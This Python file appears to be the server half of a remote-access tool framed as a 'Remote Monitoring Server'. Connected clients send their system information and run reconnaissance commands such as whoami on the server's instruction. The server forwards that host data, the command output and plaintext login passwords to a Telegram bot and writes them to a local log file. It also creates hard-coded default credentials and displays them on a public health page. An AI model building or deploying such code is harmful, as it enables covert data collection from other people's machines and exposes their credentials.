"""
Main Server Module - Optimized for Railway with Telegram Logging and HTTP Healthcheck
"""

import socket
import os
import sys
import threading
import requests
import json
import hashlib
import subprocess
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Configuration
DEBUG_MODE = True
ALLOWED_COMMANDS = ["whoami", "hostname", "ipconfig", "systeminfo", "tasklist", "netstat", "uname", "ps aux", "echo"]
AUTH_METHOD = "json"
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

# Railway provides PORT environment variable
PORT = int(os.environ.get('PORT', 5000))
HOST = '0.0.0.0'
TCP_PORT = PORT  # TCP port for client connections
HTTP_PORT = PORT  # Use same port for HTTP (Railway will route to this)

def hash_password(password):
    """Hash password with SHA256"""
    return hashlib.sha256(password.encode()).hexdigest()

def load_users():
    """Load users from JSON file"""
    try:
        # Try multiple paths for users.json
        possible_paths = [
            os.path.join(os.path.dirname(__file__), 'server', 'users.json'),
            os.path.join(os.path.dirname(__file__), 'users.json'),
            'server/users.json',
            'users.json'
        ]
        
        for users_path in possible_paths:
            if os.path.exists(users_path):
                with open(users_path, "r") as f:
                    users = json.load(f)
                    print(f"[✓] Loaded users from {users_path}")
                    return users
        
        # Create default users.json if it doesn't exist
        default_users = {
            "admin": hash_password("admin123"),
            "user": hash_password("password123")
        }
        
        # Create server directory if it doesn't exist
        os.makedirs('server', exist_ok=True)
        
        with open('server/users.json', 'w') as f:
            json.dump(default_users, f, indent=2)
        
        print("[✓] Created default users.json with admin/admin123 and user/password123")
        return default_users
        
    except Exception as e:
        print(f"[!] Error loading users: {e}")
        # Return default users as fallback
        return {
            "admin": hash_password("admin123"),
            "user": hash_password("password123")
        }

def authenticate_json(username, password):
    """JSON authentication"""
    users = load_users()
    hashed = hash_password(password)
    
    if DEBUG_MODE:
        print(f"[Debug] JSON Auth - Checking '{username}'")
        print(f"[Debug] Input hash: {hashed}")
    
    return username in users and users[username] == hashed

def authenticate(username, password):
    """Main authentication function"""
    if DEBUG_MODE:
        print("\n" + "="*50)
        print(f"[Debug] Authentication Attempt")
        print(f"[Debug] Username: '{username}'")
        print(f"[Debug] Auth Method: {AUTH_METHOD}")
        print("="*50)
    
    # Use JSON authentication
    if authenticate_json(username, password):
        if DEBUG_MODE:
            print("[Debug] ✅ SUCCESS - JSON authentication")
        return True
    
    if DEBUG_MODE:
        print("[Debug] ❌ FAILED - Authentication failed")
    
    return False

def send_telegram_message(message):
    """Send message to Telegram with retry"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] Telegram credentials not configured")
        return False
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message[:4096],  # Telegram message limit
                'parse_mode': 'HTML'
            }
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                return True
            else:
                print(f"[!] Telegram send failed (attempt {attempt+1}): {response.text}")
                time.sleep(2)
        except Exception as e:
            print(f"[!] Telegram error (attempt {attempt+1}): {e}")
            time.sleep(2)
    
    return False

def log_attempt(username, password, success, addr, command=None, output=None):
    """Log authentication attempts to Telegram"""
    hashed_password = hash_password(password)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Create formatted message
    status_emoji = "✅" if success else "❌"
    status_text = "SUCCESS" if success else "FAILED"
    
    message = f"""
🔐 <b>Authentication Attempt</b>
━━━━━━━━━━━━━━━━━━━━━━━
🕐 Time: {timestamp}
👤 Username: <code>{username}</code>
🔑 Password: <code>{password}</code>
🔒 Hash: <code>{hashed_password[:16]}...</code>
🌐 IP: {addr[0]}
📊 Status: {status_emoji} {status_text}
    """
    
    if command:
        message += f"\n💻 Command: <code>{command}</code>"
    
    if output:
        # Truncate long output
        output_preview = output[:500] + "..." if len(output) > 500 else output
        message += f"\n📤 Output:\n<code>{output_preview}</code>"
    
    send_telegram_message(message)
    
    # Also log to file for backup
    try:
        log_dir = 'logs'
        os.makedirs(log_dir, exist_ok=True)
        log_file = os.path.join(log_dir, "logs.txt")
        with open(log_file, "a") as f:
            f.write(f"{timestamp} | {username} | {password} | {addr[0]} | {status_text} | {command if command else 'N/A'}\n")
    except Exception as e:
        print(f"[!] File logging error: {e}")

def handle_tcp_client(client, addr):
    """Handle individual TCP client connection"""
    try:
        # Set timeout
        client.settimeout(30)
        
        # Receive credentials
        data = client.recv(2048).decode()
        if not data:
            return
        
        # Split username and password
        parts = data.split(",", 1)
        if len(parts) != 2:
            print(f"[!] Invalid login data from {addr}")
            client.send("AUTH_FAILED".encode())
            return
            
        username, password = parts[0], parts[1]
        
        print(f"\n[+] TCP Login attempt from {addr[0]}")
        print(f"[+] Username: '{username}'")
        
        # Authenticate
        if authenticate(username, password):
            log_attempt(username, password, True, addr)
            client.send("AUTH_SUCCESS".encode())
            
            # Receive system info
            system_info = client.recv(8192).decode()
            
            # Log system info to Telegram
            sys_info_msg = f"""
💻 <b>Client Connected</b>
━━━━━━━━━━━━━━━━━━━━━━━
{system_info}
            """
            send_telegram_message(sys_info_msg)
            
            print("\n" + "="*50)
            print("[CLIENT SYSTEM INFORMATION]")
            print("="*50)
            print(system_info)
            print("="*50)
            
            # Execute a default command
            command = "whoami"
            
            print(f"\n[+] Executing default command: {command}")
            
            # Validate and execute command
            if command not in ALLOWED_COMMANDS:
                client.send("INVALID_COMMAND".encode())
                print(f"[!] Command '{command}' blocked - not in whitelist")
                log_attempt(username, password, True, addr, command, "BLOCKED - Not in whitelist")
            else:
                client.send(command.encode())
                result = client.recv(8192).decode()
                
                # Log command execution
                log_attempt(username, password, True, addr, command, result[:1000])
                
                print("\n" + "="*50)
                print(f"[COMMAND OUTPUT: {command}]")
                print("="*50)
                print(result)
                print("="*50)
        
        else:
            log_attempt(username, password, False, addr)
            client.send("AUTH_FAILED".encode())
            print(f"[!] Failed login for: '{username}' from {addr[0]}")
    
    except socket.timeout:
        print(f"[!] Timeout from {addr}")
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        print(f"[ERROR] {error_msg}")
        try:
            send_telegram_message(f"⚠️ <b>Server Error</b>\n{error_msg}")
        except:
            pass
    finally:
        try:
            client.close()
        except:
            pass

class HealthCheckHandler(BaseHTTPRequestHandler):
    """HTTP handler for health checks and status"""
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/' or self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            status_html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Remote Monitoring Server</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        margin: 40px;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                    }}
                    .container {{
                        max-width: 800px;
                        margin: auto;
                        background: rgba(255,255,255,0.1);
                        padding: 20px;
                        border-radius: 10px;
                    }}
                    .status {{
                        color: #4ade80;
                        font-weight: bold;
                    }}
                    .info {{
                        margin: 20px 0;
                        padding: 10px;
                        background: rgba(255,255,255,0.2);
                        border-radius: 5px;
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🚀 Remote Monitoring Server</h1>
                    <p>Status: <span class="status">🟢 ONLINE</span></p>
                    <div class="info">
                        <h3>Server Information:</h3>
                        <p>📡 TCP Port: {TCP_PORT}</p>
                        <p>🔐 Auth Method: JSON</p>
                        <p>📊 Status: Running</p>
                        <p>🤖 Telegram Logging: {'✅ Enabled' if TELEGRAM_BOT_TOKEN else '❌ Disabled'}</p>
                    </div>
                    <div class="info">
                        <h3>How to Connect:</h3>
                        <p>Use a TCP client to connect to this server on port {TCP_PORT}</p>
                        <p>Credentials: Use admin/admin123 or user/password123</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            self.wfile.write(status_html.encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")
    
    def log_message(self, format, *args):
        """Suppress HTTP server logs"""
        pass

def run_http_server():
    """Run HTTP server for health checks"""
    try:
        server = HTTPServer((HOST, HTTP_PORT), HealthCheckHandler)
        print(f"[✓] HTTP Healthcheck server running on {HOST}:{HTTP_PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] HTTP Server error: {e}")

def run_tcp_server():
    """Run TCP server for client connections"""
    max_retries = 5
    retry_delay = 10
    
    for attempt in range(max_retries):
        try:
            # Create TCP socket
            tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tcp_server.bind((HOST, TCP_PORT))
            tcp_server.listen(5)
            
            print(f"[✓] TCP Server listening on {HOST}:{TCP_PORT}")
            print("[✓] Waiting for client connections...\n")
            
            # Main TCP loop
            while True:
                try:
                    client, addr = tcp_server.accept()
                    print(f"[+] TCP Connection from {addr}")
                    
                    # Handle client in new thread
                    client_thread = threading.Thread(
                        target=handle_tcp_client,
                        args=(client, addr),
                        daemon=True
                    )
                    client_thread.start()
                except Exception as e:
                    print(f"[!] Error accepting TCP connection: {e}")
                    continue
        
        except Exception as e:
            print(f"\n[!] TCP Server error on attempt {attempt + 1}: {e}")
            if attempt < max_retries - 1:
                print(f"[!] Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            else:
                print("[!] Max retries reached. Exiting...")
                sys.exit(1)

def start_server():
    """Start both HTTP and TCP servers"""
    try:
        # Send startup message to Telegram
        start_msg = f"""
🚀 <b>Remote Monitoring Server Started</b>
━━━━━━━━━━━━━━━━━━━━━━━
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 Host: {HOST}
🔌 HTTP Port: {HTTP_PORT}
🔌 TCP Port: {TCP_PORT}
📊 Status: Online
🔐 Auth: JSON
        """
        send_telegram_message(start_msg)
        
        # Print server info
        print("\n" + "="*50)
        print("  REMOTE MONITORING SERVER (Railway)")
        print("="*50)
        print(f"\n[+] Server Host: {HOST}")
        print(f"[+] HTTP Port: {HTTP_PORT} (for health checks)")
        print(f"[+] TCP Port: {TCP_PORT} (for client connections)")
        print(f"[+] Auth Method: JSON")
        print(f"[+] Telegram Logging: {'Enabled' if TELEGRAM_BOT_TOKEN else 'Disabled'}")
        
        # Test users.json
        users = load_users()
        print(f"[+] Available users: {', '.join(users.keys())}")
        print("\n[!] Default credentials: admin/admin123, user/password123")
        print("="*50)
        print("\n[✓] Server is running!\n")
        
        # Start HTTP server in a separate thread
        http_thread = threading.Thread(target=run_http_server, daemon=True)
        http_thread.start()
        
        # Run TCP server in main thread
        run_tcp_server()
    
    except KeyboardInterrupt:
        print("\n\n[+] Server shutting down...")
        send_telegram_message("🛑 <b>Server Shutting Down</b>")
    except Exception as e:
        error_msg = f"Server error: {str(e)}"
        print(f"\n[!] {error_msg}")
        send_telegram_message(f"⚠️ <b>Critical Error</b>\n{error_msg}")
        sys.exit(1)

if __name__ == "__main__":
    start_server()